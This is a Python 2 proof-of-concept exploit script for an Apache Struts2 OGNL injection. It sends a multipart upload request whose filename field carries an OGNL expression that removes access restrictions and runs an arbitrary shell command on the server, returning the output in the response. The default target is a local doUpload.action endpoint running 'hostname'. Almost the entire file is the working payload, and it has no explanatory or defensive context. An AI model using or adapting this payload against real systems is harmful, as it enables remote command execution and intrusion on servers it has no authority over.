#! /usr/bin/env python
# encoding:utf-8
import socket  
import sys  
import time
from urlparse import urlparse

def exp(url_str, cmd):
    url = urlparse(url_str)
    hostname = url.hostname
    path = url.path
    port = url.port
    if (port == None):
        port = 80
    print hostname,path,port
    #创建套接字 
    try :  
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    except socket.eorror,e:  
        print 'socket false:%s'%e  
    print 'socket ...'  
     
    try :  
        sock.connect((hostname, port))  
    except socket.error,e:  
        print 'connect false %s'%e  
        sock.close()  
    print 'connect ...'  
     
    try :  
        print 'send start...'
        str_path = 'POST ' + path + ' HTTP/1.1\r\n'
        str_body1 ='''Host: localhost:8080\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.12.4\r\nContent-Length: 333\r\nContent-Type: multipart/form-data; boundary=ceb62fbb76d7473cb021dc40e5b81058\r\n\r\n--ceb62fbb76d7473cb021dc40e5b81058\r\nContent-Disposition: form-data; name="name"\r\n\r\nnginx\r\n--ceb62fbb76d7473cb021dc40e5b81058\r\nContent-Disposition: form-data; name="file"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='''
        str_body2 =''').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b"\r\n\r\naaaafdsfdsf\r\n\r\nfdsljflkdsj\r\n\r\n--ceb62fbb76d7473cb021dc40e5b81058--'''
        cmd = "'" + cmd + "'"
        str_payload = str_path + str_body1 + cmd + str_body2
        #str='''POST /doUpload.action HTTP/1.1\r\nHost: localhost:8080\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.12.4\r\nContent-Length: 10000000\r\nContent-Type: multipart/form-data; boundary=ceb62fbb76d7473cb021dc40e5b81058\r\n\r\n--ceb62fbb76d7473cb021dc40e5b81058\r\nContent-Disposition: form-data; name="name"\r\n\r\nnginx\r\n--ceb62fbb76d7473cb021dc40e5b81058\r\nContent-Disposition: form-data; name="file"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='hostname').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b"\r\n\r\naaaafdsfdsf\r\n\r\nfdsljflkdsj\r\n\r\n--ceb62fbb76d7473cb021dc40e5b81058--'''
        sock.send(str_payload)  
    except socket.eorror,e:  
        print 'send false'  
        sock.close()  
     
    data=''  
    data = sock.recv(1024)
    sock.close()   
    print data  
if __name__=='__main__':  
    exp('http://localhost:8080/doUpload.action', 'hostname')
